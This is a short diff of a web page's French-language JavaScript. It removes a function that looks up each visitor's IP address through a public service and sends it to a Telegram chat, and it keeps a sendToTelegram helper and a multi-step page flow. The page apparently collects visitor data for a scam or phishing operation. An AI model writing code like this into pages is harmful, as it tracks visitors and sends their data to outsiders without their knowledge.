@@ -105,15 +105,7 @@
         body: JSON.stringify(data)
       });
     }
-    function getUserIP() {
-      fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const userIP = data.ip;
-          sendToTelegram(`Adresse IP détectée : ${userIP}`);
-        })
-        .catch(error => console.error('Erreur récupération IP:', error));
-    }
+ 
     setTimeout(() => {
       document.getElementById('step-2').classList.add('hidden');
       document.getElementById('step-3').classList.remove('hidden');
